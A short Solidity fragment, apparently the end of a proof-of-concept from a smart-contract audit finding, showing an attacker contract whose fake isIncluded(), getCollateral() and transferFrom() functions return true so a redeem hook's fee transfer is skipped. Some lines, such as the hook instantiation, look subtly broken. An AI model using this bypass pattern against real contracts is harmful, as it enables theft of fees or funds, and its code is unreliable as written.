    function isIncluded(address sender) external returns (bool) {
        return true;
    }

    //Bypassing the redeemhook's call `IPrePOMarket(msg.sender).getCollateral().transferFrom(msg.sender, _treasury, fee);` to make return true.

    function CallRedeemhook() public {
        Reedemhook hook = hook(address(0x01));
        hook.hook(address(this), 10203000000, 0);
    }

    function getCollateral() external returns (address) {
        return address(this);
    }

    //Fake Transferfrom() returns true to make successfull call on redeeemhook's hook() function.
    function transferFrom(address sender, address receiver, uint amount) external returns (bool) {
        return true;
    }
}
```

